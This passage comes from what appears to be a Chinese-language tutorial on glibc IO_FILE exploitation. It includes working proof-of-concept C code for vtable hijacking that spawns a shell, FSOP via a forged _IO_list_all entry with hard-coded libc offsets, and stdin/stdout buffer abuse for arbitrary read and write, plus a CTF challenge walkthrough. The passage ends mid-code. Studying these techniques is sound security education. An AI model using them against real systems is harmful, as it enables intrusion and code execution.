<li><code>__underflow</code> 函数调用了 <code>vtable</code> 中的 <code>_IO_new_file_underflow</code> 实现文件数据读取。</li>
<li><code>vtable</code> 中的 <code>_IO_new_file_underflow</code> 调用了 <code>vtable__GI__IO_file_read</code> 最终去执行系统调用<code>read</code>。</li>
</ul>
<p><code>fwrite</code> 函数调用的 <code>vtable</code> 函数有：</p>
<ul>
<li><code>_IO_fwrite</code> 函数调用了 <code>vtable</code> 的 <code>_IO_new_file_xsputn</code> 。</li>
<li><code>_IO_new_file_xsputn</code> 函数调用了 <code>vtable</code> 中的 <code>_IO_new_file_overflow</code> 实现缓冲区的建立以及刷新缓冲区。</li>
<li><code>vtable</code> 中的 <code>_IO_new_file_overflow</code> 函数调用了 <code>vtable</code> 的 <code>_IO_file_doallocate</code> 以初始化输入缓冲区。</li>
<li><code>vtable</code> 中的 <code>_IO_file_doallocate</code> 调用了 <code>vtable</code> 中的 <code>__GI__IO_file_stat</code> 以获取文件信息。</li>
<li><code>new_do_write</code> 中的 <code>_IO_SYSWRITE</code> 调用了 <code>vtable_IO_new_file_write</code> 最终去执行系统调用<code>write</code>。</li>
</ul>
<p><code>fclose</code> 函数调用的 <code>vtable</code> 函数有：</p>
<ul>
<li>在清空缓冲区的 <code>_IO_do_write</code> 函数中会调用 <code>vtable</code> 中的函数。</li>
<li>关闭文件描述符 <code>_IO_SYSCLOSE</code> 函数为 <code>vtable</code> 中的 <code>__close</code> 函数。</li>
<li><code>_IO_FINISH</code> 函数为 <code>vtable</code> 中的 <code>__finish</code> 函数。</li>
</ul>
<p>下面举一个实际的例子：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> i8;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(<span class="string">&quot;./123.txt&quot;</span>, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    i64 *fake_vtable = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    fake_vtable[<span class="number">7</span>] = (i64) &amp;system;</span><br><span class="line">    i64 *vtable_addr = (i64 *) ((i8 *) fp + <span class="number">0xD8</span>);</span><br><span class="line">    *vtable_addr = (i64) fake_vtable;</span><br><span class="line">    <span class="built_in">memcpy</span>(fp, <span class="string">&quot;sh&quot;</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">fwrite</span>(<span class="string">&quot;hi&quot;</span>, <span class="number">2</span>, <span class="number">1</span>, fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>使用的 libc 版本如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">	crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">	GNU Libidn by Simon Josefsson</span><br><span class="line">	Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">	BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure></div>
<p>此版本 libc 没有 <code>_IO_vtable_check</code> 检查，因此可以随意伪造 <code>vtable</code> 。<br>在执行 <code>fwrite</code> 时会调用 <code>vtable</code> 中的 <code>_IO_new_file_xsputn</code> ，参数为对应的 <code>_IO_FILE_plus</code> ，因此在伪造的 <code>vtable</code> 对应位置上写入 <code>system</code> 地址，并在 <code>_IO_FILE_plus</code> 所在地址写入 <code>sh\x00</code> ，然后调用 <code>fwrite</code> 即可得到 shell 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/31f2c653ca8ba5a889437b6e7522adc8.png"
                      alt="在这里插入图片描述"
                ><br>例题：<a class="link"   href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/" >2018 HCTF the_end <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is a gift %p, good luck ;)\n&quot;</span>, &amp;sleep);</span><br><span class="line">  <span class="built_in">fflush</span>(_bss_start);</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1337</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>分析程序，发现可以获取 libc 基地址，然后有 5 次 1 字节的任意地址写。<br><code>exit</code> 函数会执行 <code>_IO_cleanup</code> 函数。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don&#x27;t have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they&#x27;re supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>_IO_flush_all_lockp</code> 函数如果缓冲区有数据没有输出会执行  <code>_IO_overflow</code>  ，<code>_IO_unbuffer_all</code> 函数会执行 <code>_IO_setbuf</code> 。<br>这里调试发现只执行后者，因此可以在 <code>_IO_2_1_stderr_</code> 中伪造 <code>vtable</code> 使得  <code>_IO_setbuf</code> 位置恰好为某个指向 libc 附近的指针。然后再修改 <code>FILE</code> 使得 <code>*vtable</code> 指向伪造的 <code>vtable</code> 。最后 <code>exit</code> 得到 shell 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ba6f899dba2824e1508bbeac6dc19363.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                ></p>
<h1 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h1><p>FSOP 的核心思想就是劫持 <code>_IO_list_all</code> 指向伪造的 <code>_IO_FILE_plus</code> 。之后使程序执行 <code>_IO_flush_all_lockp</code> 函数。该函数会刷新 <code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 <code>FILE</code> 调用 <code>fflush</code> ，也对应着会调用 <code>_IO_FILE_plus.vtable</code> 中的 <code>_IO_overflow</code> 。</p>
<p>在利用时要注意以下几点：</p>
<ul>
<li><p>程序执行 <code>_IO_flush_all_lockp</code> 函数有三种情况：</p>
<ul>
<li>当 <code>libc</code> 执行 <code>abort</code> 流程时</li>
<li>当执行 <code>exit</code> 函数时</li>
<li>当执行流从 <code>main</code> 函数返回时</li>
</ul>
</li>
<li><p>伪造的 <code>_IO_FILE_plus</code> 中的 <code>FILE</code> 需要绕过如下检查：</p>
  <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW(fp, EOF) == EOF) &#123;</span><br><span class="line">    result = EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li><p>由于 <code>vtable</code> 伪造的位置绕不过 <code>_IO_vtable_check</code> 的检查，因此仅适应于 libc2.24 版本以下。</p>
</li>
</ul>
<p>下面举一个 FSOP 的实际例子：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x6F5D0</span>;</span><br><span class="line">    i64 *ptr = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    ptr[<span class="number">24</span>] = <span class="number">0x0</span>;<span class="comment">//_mode</span></span><br><span class="line">    ptr[<span class="number">5</span>] = <span class="number">0x1</span>;<span class="comment">//_IO_write_ptr</span></span><br><span class="line">    ptr[<span class="number">4</span>] = <span class="number">0x0</span>;<span class="comment">//_IO_write_base</span></span><br><span class="line">    ptr[<span class="number">27</span>] = (i64) &amp;ptr[<span class="number">32</span>];<span class="comment">//*vtable</span></span><br><span class="line">    ptr[<span class="number">32</span> + <span class="number">3</span>] = libc_base + <span class="number">0x4525A</span>;<span class="comment">//_IO_overflow</span></span><br><span class="line">    i64 *list_all_ptr = (i64 *) (libc_base + <span class="number">0x3C4520</span>);</span><br><span class="line">    list_all_ptr[<span class="number">0</span>] = (i64) ptr;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>使用的 libc 版本如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu3) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.3.1 20160413.</span><br><span class="line">Available extensions:</span><br><span class="line">	crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">	GNU Libidn by Simon Josefsson</span><br><span class="line">	Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">	BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure></div>
<p>上述程序利用过程如下图<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/fad85d11f5ddfbc00c817d6af8a8dbb1.png"
                      alt="在这里插入图片描述"
                ><br>最后 <code>exit(0)</code> 进行如下函数调用：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/fe87cde62122bed3d4cb7a8a1e1a5d46.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                ><br>程序执行效果：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/cc7c6fdbbb535a472618b90c8e268fd9.png"
                      alt="在这里插入图片描述"
                ></p>
<h1 id="缓冲区的相关利用"><a href="#缓冲区的相关利用" class="headerlink" title="缓冲区的相关利用"></a>缓冲区的相关利用</h1><h2 id="stdin-标准输入缓冲区进行任意地址写"><a href="#stdin-标准输入缓冲区进行任意地址写" class="headerlink" title="stdin 标准输入缓冲区进行任意地址写"></a>stdin 标准输入缓冲区进行任意地址写</h2><p>根据前面对 <code>fread</code> 的分析已经知道通过缓冲区进行输入的大致流程，但要实现任意地址写还要绕过其中具体的检查。</p>
<ul>
<li><p><code>_IO_file_xsgetn</code> </p>
<ul>
<li><code>fp-&gt;_IO_buf_base </code> 为空时会执行 <code>_IO_doallocbuf(fp)</code> 初始化缓冲区，因此 <code>fp-&gt;_IO_buf_base </code> 不能为空。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">free</span>(fp-&gt;_IO_save_base);</span><br><span class="line">        fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">    _IO_doallocbuf(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>如果 <code>fp-&gt;_IO_read_end</code> &gt; <code> fp-&gt;_IO_read_ptr</code> 会将缓冲区中对应的数据复制到目标地址中，为了避免因为这个出现不必要的问题，最好令 <code>fp-&gt;_IO_read_end</code> &#x3D; <code> fp-&gt;_IO_read_ptr</code> 。  <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (have &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    s = __mempcpy(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">    want -= have;</span><br><span class="line">    fp-&gt;_IO_read_ptr += have;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>如果需要读入的数据长度如果大于缓冲区大小会采用直接读入的方式，因此不能使读入的数据长度大于缓冲区大小。  <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (__underflow(fp) == EOF)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p><code>_IO_new_file_underflow</code></p>
<ul>
<li><code>_flags</code> 的 <code> _IO_NO_READS</code> 标志为不能为 1 。标志的定义是 <code>#define _IO_NO_READS 4</code> 。  <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS) &#123;</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno(EBADF);</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>最终系统调用 <code>_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</code> 读取数据，因此要想利用stdin输入缓冲区需设置 <code>FILE</code> 结构体中 <code>_IO_buf_base</code> 为<code>write_start</code> ，<code>_IO_buf_end</code> 为 <code>write_end</code> 。同时也需将结构体中的 <code>fp-&gt;_fileno</code> 设置为 0 ，最终调用 <code>read (fp-&gt;_fileno, buf, size))</code> 读取数据。  <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ul>
<p>将上述条件综合表述为：</p>
<ul>
<li>设置 <code>_IO_read_end</code> 等于 <code>_IO_read_ptr</code> 。</li>
<li>设置 <code>_flag</code> &amp;~ <code>_IO_NO_READS</code> 即 <code>_flag</code> &amp;~ 0x4。</li>
<li>设置 <code>_fileno</code> 为 0 ，表示读入数据的来源是 <code>stdin</code> 。</li>
<li>设置 <code>_IO_buf_base</code> 为 <code>write_start</code> ，<code>_IO_buf_end</code> 为 <code>write_end</code> ；且使得 <code>_IO_buf_end</code> - <code>_IO_buf_base</code> 大于 <code>fread</code> 要读的数据。</li>
</ul>
<p>举例：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[<span class="number">100</span>];</span><br><span class="line"><span class="comment">//    i64 libc_base = (i64) &amp;puts - 0x84420;</span></span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(<span class="string">&quot;123.txt&quot;</span>, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line"><span class="comment">//    FILE *fp = (FILE *) (libc_base + 0x1EC980);</span></span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr = <span class="number">0x0</span>;</span><br><span class="line">    fp-&gt;_flags &amp;= ~<span class="number">0x4</span>;</span><br><span class="line">    fp-&gt;_fileno = <span class="number">0x0</span>;</span><br><span class="line">    fp-&gt;_IO_buf_base = (<span class="type">char</span> *) buf;</span><br><span class="line">    fp-&gt;_IO_buf_end = (<span class="type">char</span> *) &amp;buf[<span class="number">99</span>];</span><br><span class="line">    <span class="built_in">fread</span>(stack_buf, <span class="number">1</span>, <span class="number">3</span>, fp);</span><br><span class="line"><span class="comment">//    scanf(&quot;%s&quot;, stack_buf);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_buf: %s\n&quot;</span>, stack_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>libc 采用如下版本：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.8) stable release version 2.31.</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 9.4.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC ABSOLUTE</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure></div>
<p>运行结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaa</span><br><span class="line">buf: aaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">stack_buf: aaa</span><br></pre></td></tr></table></figure></div>
<h2 id="stdout-标准输入缓冲区进行任意地址读写"><a href="#stdout-标准输入缓冲区进行任意地址读写" class="headerlink" title="stdout 标准输入缓冲区进行任意地址读写"></a>stdout 标准输入缓冲区进行任意地址读写</h2><p><code>stdout</code> 可以把某地址数据复制到缓冲区，然后输出出来。如果可控 <code>stdout</code> 结构体，通过构造可实现利用其进行任意地址读以及任意地址写。</p>
<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p><code>_IO_new_file_xsputn</code> 函数中有如下操作：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"><span class="comment">/* Then fill the buffer. */</span></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; to_do)count = to_do;</span><br><span class="line">    f-&gt;_IO_write_ptr = __mempcpy(f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">    s += count;</span><br><span class="line">    to_do -= count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>即当输出缓冲区不满的时候，就将待输出数据复制到输出缓冲区。因此只要将<code>_IO_write_ptr</code> 指向 <code>write_start</code> ，<code>_IO_write_end</code> 指向 <code>write_end</code> 即可实现在目标地址写入数据。<br>举例（libc 版本同上）：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[] = <span class="string">&quot;abcdefghi&quot;</span>;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    FILE *fp = (FILE *) (libc_base + <span class="number">0x1ed6a0</span>);</span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) &amp;buf[<span class="number">0</span>];</span><br><span class="line">    fp-&gt;_IO_write_end = (<span class="type">char</span> *) &amp;buf[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(stack_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>运行结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">efghi</span><br><span class="line">buf: abcd56</span><br></pre></td></tr></table></figure></div>
<p>其中复制到 <code>buf</code> 中的数据没有输出的原因是 <code>_IO_overflow</code> 函数没有正常执行，接下来任意地址读会有更多分析。 </p>
<h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><p>程序正确执行到 <code>_IO_overflow</code> 时会将输出缓冲区中的数据输出出来，只要将要泄露的位置设置为输出缓冲区就可以泄露内容。但还要绕过一系列检查：</p>
<ul>
<li><code>_IO_new_file_xsputn</code><ul>
<li>如果 <code>f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr</code> 说明输出缓冲区还没有写满，就会将待输出的数据写入缓冲区，实际上 <code>_IO_overflow</code> 只有在输出缓冲区写满的时候才将其输出。因此为了不造成不必要的麻烦，直接令 <code>f-&gt;_IO_write_end = f-&gt;_IO_write_ptr</code> 。<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"><span class="comment">/* Then fill the buffer. */</span></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; to_do)count = to_do;</span><br><span class="line">    f-&gt;_IO_write_ptr = __mempcpy(f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">    s += count;</span><br><span class="line">    to_do -= count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><code>_IO_new_file_overflow</code><ul>
<li><p><code>_flags</code> 不能包含 <code>_IO_NO_WRITES</code> ，其中 <code>_IO_NO_WRITES</code> 的值为 0x8 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">&#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno(EBADF);</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li><p>为了避免进入如下分枝进造成不必要的麻烦， <code>_flags</code> 应包含 <code>_IO_CURRENTLY_PUTTING</code> ，其中 <code>_IO_CURRENTLY_PUTTING</code> 的值为 0x0800 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li><p>为了调用 <code>_IO_do_write</code> 输出缓冲区内容，令 <code>_IO_write_base = read_start</code> ，<code>_IO_write_ptr = read_end</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write(f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><code>new_do_write</code><ul>
<li><p>构造 <code>_flags</code> 包含 <code>_IO_IS_APPENDING</code> 或者 <code>_IO_read_end</code> 等于 <code>_IO_write_base</code> 就可以直接执行到 <code>_IO_SYSWRITE</code> 。其中 <code>_IO_IS_APPENDING</code> 的值为 0x1000 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> count;</span><br><span class="line"> <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">   <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">      you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">      not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">      Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">      unpredictable. */</span></span><br><span class="line">   fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">off64_t</span> new_pos</span><br><span 